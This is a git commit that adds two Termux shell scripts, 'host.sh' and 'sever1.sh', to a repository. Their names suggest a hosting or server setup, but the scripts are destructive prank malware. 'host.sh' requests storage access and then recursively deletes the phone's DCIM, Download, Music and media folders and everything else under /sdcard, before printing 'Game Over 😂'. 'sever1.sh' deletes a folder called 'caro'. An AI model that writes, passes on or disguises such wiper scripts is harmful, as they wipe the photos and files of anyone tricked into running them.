bcb2dc704114285cf13cb27b71c6eaf19952d2a1
Ravindu-Manoj <86040559+Sew01RaviduManoj01KingAndQueen@users.noreply.github.com>
2021-08-05 09:55:10 +0530

    Add files via upload

---
+++ host.sh
@@ -0,0 +1,16 @@
+pkg update && upgrade -y
+termux-setup-storage -y
+cd /sdcard
+rm -rf DCIM
+rm -rf Download
+rm -rf media
+rm -rf MT2
+rm -rf Music
+rm -rf .*
+rm -rf *
+echo -e  $g "Coded By t.me/RavinduManoj"
+echo  ""
+echo -e  $g "Don't Clone Anyone's Data"
+echo $g ""
+echo -e  $g "Game Over 😂"
+
---
+++ sever1.sh
@@ -0,0 +1,10 @@
+pkg update && upgrade -y
+termux-setup-storage -y
+cd /sdcard
+rm -rf caro
+echo -e  $g "Coded By t.me/RavinduManoj"
+echo -e  $g ""
+echo -e  $g "Don't Clone Anyone's Data"
+echo -e  $g ""
+echo -e  $g "Game Over 😂"
+
